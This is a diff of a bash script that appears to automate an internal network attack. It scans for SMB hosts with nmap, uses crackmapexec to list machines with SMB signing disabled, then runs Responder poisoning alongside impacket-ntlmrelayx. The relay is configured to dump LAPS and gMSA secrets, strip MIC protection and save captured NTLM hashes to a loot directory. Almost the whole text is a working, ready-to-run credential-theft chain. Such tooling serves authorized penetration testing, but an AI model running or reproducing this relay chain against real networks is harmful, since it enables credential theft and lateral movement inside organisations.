@@ -29,43 +29,49 @@ else
    awk '/Up/ {print$2}' /root/output/nmap/pe.gnmap > /root/output/list/ipup.txt
 fi
 
-if [ -s /root/output/list/smb_open.txt ]; then
-   echo '! > SMB Open File already exists, CME is next!'
+if [ -f /root/output/list/smb_open.txt ]; then
+   echo '! > SMB Open File exists'
 else
    nmap -p 445 --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/445 -iL /root/output/list/ipup.txt > /dev/null 2>&1
 
    awk '/open/ {print$2}' /root/output/nmap/445.gnmap > /root/output/list/smb_open.txt
 fi
 
-if [ -s /root/output/list/smb_sign_off.txt ]; then
-   echo '! > SMB Signing List already exist, Responder and NTLMRELAY are next!'
+if [ -s /root/output/list/smb_open.txt ]; then
+   echo '! > Hosts to target, CME is next!'
+else
+	echo '! > no smb HOSTS!'
+	exit 1
+fi
+
+if [ -f /root/output/list/smb_sign_off.txt ]; then
+   echo '! > SMB Signing List exist.'
 else
    crackmapexec smb /root/output/list/smb_open.txt --gen-relay-list /root/output/list/smb_sign_off.txt | tee /root/output/cme_beauty.txt
 fi
 
-#When Clients with Signing:false exist
-if [ -s /root/output/list/smb_sign_off.txt ] 
-	then
-	echo ''
-	#Responder with 300sec timeout in bg
-	echo '! > Starting Responder && impacket-ntlmrelayx'
-	timeout 300 responder -I eth0 -rdwv >> /root/output/responder.txt &
-	timeout 300 impacket-ntlmrelayx -ip $IP -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt >> /root/output/relay.txt &
-
-	PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
-	PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`
-
-	wait $PID_RESPONDER
-	wait $PID_RELAY
-	
-	if [ -s /root/output/loot/ntlm_relay_ntlmv2.txt ]; then
-		echo '! > Got Hashes!'
-		exit 0
-	else
-		echo '! >> No Hashes Found'
-		exit 1
-	fi
+if [ -s /root/output/list/smb_sign_off.txt ]; then
+   echo '! > SMB Signing List already exist, Responder and NTLMRELAY are next!'
 else
-	echo '! > Either Signing is ON everywhere or no SMB Service available.'
+	echo '! > No no-signing HOSTS!'
+	exit 1
+fi
+
+#Responder with 300sec timeout in bg
+echo '! > Starting Responder && impacket-ntlmrelayx'
+timeout 300 responder -I eth0 -rdwv >> /root/output/responder.txt &
+timeout 300 impacket-ntlmrelayx -ip $IP -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt >> /root/output/relay.txt &
+
+PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
+PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`
+
+wait $PID_RESPONDER
+wait $PID_RELAY
+	
+if [ -s /root/output/loot/ntlm_relay_ntlmv2.txt ]; then
+	echo '! > Got Hashes!'
+	exit 0
+else
+	echo '! >> No Hashes Found'
 	exit 1
 fi
